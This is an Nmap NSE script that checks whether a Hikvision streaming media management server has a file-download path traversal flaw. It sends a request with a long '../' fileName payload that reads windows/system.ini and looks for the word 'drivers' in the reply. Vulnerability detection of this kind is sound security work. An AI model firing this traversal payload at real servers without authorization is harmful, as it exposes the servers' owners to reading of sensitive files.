local http = require "http"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"

description = [[
杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，
攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息
]]

author = "seaung"


license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "hkvision", "vuln-detect" }


portrule = shortport.port_or_service({ 80, 443, 4444, 8000, 8080, 8443, 9000, 9001, 9090 }, { "http", "https" }, "tcp", "open")

--print("start...")

action = function(host, port)
	local output = stdnse.output_table()
	local path = "/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini"
	local check_txt = "drivers"

	local response = http.get(host, port, path)

	--print(response.body)

	if response.status == 200 and string.find(response.body, check_txt) ~= nil then
		output = "[+] Found vulnerable"
	else
		output = "[-] Not Found vulnerable"
	end

	return output
end
